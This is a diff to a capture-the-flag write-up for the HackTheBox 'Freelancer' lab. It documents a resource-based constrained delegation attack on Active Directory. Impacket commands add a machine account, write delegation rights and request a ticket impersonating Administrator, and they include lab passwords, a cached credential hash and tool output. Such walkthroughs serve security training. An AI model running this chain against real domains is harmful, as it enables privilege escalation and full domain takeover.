@@ -4,7 +4,7 @@
 - CTF Description: 
 - Date: 
 - Platform: 
-- Category: 
+- Category: #Delegation
 
 # Findings
 
@@ -205,15 +205,17 @@ FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb
 ![](https://i.imgur.com/8WKf9dq.png)
 - It is on the AD Recycle group so we can get the deleted things
 	- ![](https://i.imgur.com/krJa0RI.png)
-- But there is nothing to look for so when i check back to my bloodhound. i saw that the ad recycle is generic write on the dc
+- But there is nothing to look for so when i check back to my bloodhound. i saw that the ad recycle is generic write on the dc also there is a delegations on the group. so the user `lorra199` have this permissions.
+	- ![](https://i.imgur.com/MWe2fJn.png)
+![](https://i.imgur.com/I37moji.png)
+
 ```shell
 rexder@HunterMachine ~> impacket-addcomputer 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199' -dc-ip 10.129.194.233 -computer-name rexder -computer-pass 'password@123'
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [*] Successfully added machine account rexder$ with password password@123.
                                                   ^
-rexder@HunterMachine ~> impacket-rbcd -action write -delegate-from "rexder\$" -delegate-to "dc\$" freelancer.htb/'lorra199':'PWN3D
-#l0rr@Armessa199' -dc-ip 10.129.194.233
+rexder@HunterMachine ~> impacket-rbcd -action write -delegate-from "rexder\$" -delegate-to "dc\$" freelancer.htb/'lorra199':'PWN3D#l0rr@Armessa199' -dc-ip 10.129.194.233
 
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -223,7 +225,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Accounts allowed to act on behalf of other identity:
 [*]     rexder$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
 
-rexder@HunterMachine ~> impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator -dc-ip 10.129.194.233 freelancer.htb/'rexder$:hackyou@123'
+rexder@HunterMachine ~> faketime -f +5h impacket-getST -spn cifs/dc.freelancer.htb -impersonate Administrator -dc-ip 10.129.194.233 freelancer.htb/'rexder$:hackyou@123'
 
 
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
